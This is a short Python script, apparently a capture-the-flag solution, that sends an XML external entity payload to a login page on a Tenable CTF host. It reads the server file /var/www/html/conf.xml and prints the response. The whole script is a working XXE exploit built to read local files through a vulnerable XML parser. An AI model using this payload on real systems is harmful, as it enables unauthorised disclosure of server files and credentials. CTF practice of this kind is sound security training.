#!/usr/bin/env python3

import requests

url = 'http://alpha.tenable-ctf.io:5678/login.php'
path = '/var/www/html/conf.xml'
hostname = 'd439a8e04ab8'
ip = '172.17.0.4 '

data = f'''<?xml version='1.0'?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file://{path}" >]>
<foo>&xxe;</foo>'''

r = requests.post(url, data=data)
print(r.text)
